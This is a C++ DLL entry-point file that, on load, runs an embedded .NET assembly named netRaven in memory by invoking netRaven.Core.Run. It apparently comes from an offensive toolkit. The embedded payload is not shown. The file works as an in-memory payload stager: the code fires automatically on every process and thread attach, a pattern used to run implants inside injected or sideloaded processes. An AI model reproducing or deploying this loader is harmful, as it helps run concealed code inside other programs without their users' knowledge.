// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"
#include "clr.hpp"
#include "netRaven_dll.hpp"

void LoadAndRun(LPVOID lpParam)
{
	clr::ClrDomain domain;
	std::vector<uint8_t> vec(netraven_dll, netraven_dll + NETRAVEN_dll_len);
	//Load the assembly into the app domain
	auto res = domain.load(vec);

	if (!res) {
		exit(0);
	}

	//Call the public static Execute method for the selected module
	res->invoke_static(L"netRaven.Core", L"Run", L"");
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
		LoadAndRun(NULL);
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

